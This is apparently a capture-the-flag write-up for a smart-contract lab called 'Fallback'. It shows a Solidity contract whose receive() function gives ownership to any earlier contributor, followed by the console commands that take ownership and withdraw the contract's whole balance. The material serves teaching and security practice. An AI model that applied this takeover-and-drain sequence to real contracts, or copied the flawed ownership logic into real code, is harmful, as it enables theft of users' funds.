## This is the vulnerable Smart Contract code :
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```
Basically, I need to claim ownership in the contract and withdraw the money from the contract.

To do so:
There's two way to claim the ownership if I look at the code. First, I contribute more than the owner, wich is 1000ETH and I don't have that in my wallet lol.
The other way would be to call the fallback function `receive()`.

To get the owner contribution : 
```solidity
ownerAddr = await contract.owner();
await contract.contributions('0x9CB391dbcD447E645D6Cb55dE6ca23164130D008').then(v => v.toString())
```

To get the contract balance :
```solidity
await getBalance(contract.address)
```
I contribute to the contract with 0.0001 ETH in wei, because the `require(msg.value < 0.001 ether);` require to contribute less than 0.001 ether.
```solidity
await contract.contribute.sendTransaction({ from: player, value: toWei('0.0001')})
```
I can see my contribution using this javascript function :
```solidity
await contract.getContribution().then(v => v.toString())
```
To trigger the fallback function, i send a non-zero number :
```solidity
await sendTransaction({from: player, to: contract.address, value: toWei('0.000001')})
```

Dont forget to claim back the funds !
```solidity
await contract.withdraw()
```

That's it. I submitted the lab and voilà.

x: https://x.com/returNothing
